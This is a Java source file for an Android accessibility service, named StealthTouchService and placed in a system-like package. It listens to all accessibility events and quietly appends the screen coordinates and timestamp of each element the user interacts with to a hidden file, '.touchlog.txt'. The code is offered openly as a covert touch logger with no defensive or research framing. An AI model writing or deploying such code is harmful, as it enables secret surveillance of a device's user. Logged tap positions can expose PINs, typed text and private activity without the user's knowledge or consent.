package com.sys.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.graphics.Rect;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class StealthTouchService extends AccessibilityService {

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);

        Log.d("StealthTouchService", "Accessibility service started");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event.getSource() == null) return;

            AccessibilityNodeInfo source = event.getSource();
            Rect bounds = new Rect();
            source.getBoundsInScreen(bounds);

            int x = bounds.centerX();
            int y = bounds.centerY();

            logTouchToFile(x, y);
        } catch (Exception e) {
            Log.e("StealthTouch", "Error in logging touch: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.d("StealthTouchService", "Service interrupted");
    }

    private void logTouchToFile(int x, int y) {
        String filename = ".touchlog.txt"; // Hidden file
        File logFile = new File(getFilesDir(), filename);
        try {
            FileWriter writer = new FileWriter(logFile, true);
            String data = System.currentTimeMillis() + "," + x + "," + y + "\n";
            writer.write(data);
            writer.close();
            Log.d("TouchLogger", "Logged: " + data);
        } catch (IOException e) {
            Log.e("TouchLogger", "Failed to write log", e);
        }
    }
}
